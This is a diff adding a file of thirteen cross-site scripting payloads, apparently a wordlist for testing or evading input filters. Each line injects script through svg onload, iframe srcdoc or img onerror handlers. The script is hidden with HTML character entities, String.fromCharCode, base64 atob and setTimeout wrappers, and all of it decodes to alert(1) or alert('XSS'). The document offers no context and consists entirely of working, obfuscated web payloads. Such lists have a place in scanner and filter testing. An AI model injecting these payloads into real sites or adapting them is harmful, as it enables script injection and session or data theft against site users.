@@ -1,0 +1,13 @@
+<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>">
+<svg onload="setTimeout(function(){&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;},0)">
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>">
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">
+<svg onload="eval(&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;)">
+<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
+<iframe srcdoc="<img src=x onerror=eval(&#39;&#97;&#108;&#101;&#114;&#116;(1)&#39;)>">
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>">
+<svg onload="setTimeout(function(){eval(&#39;&#97;&#108;&#101;&#114;&#116;(1)&#39;)},0)">
+<svg onload="eval(atob(&#39;YWxlcnQoMSk=&#39;))">
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">
+<iframe srcdoc="<svg onload=eval(atob(&#39;YWxlcnQoMSk=&#39;))>">
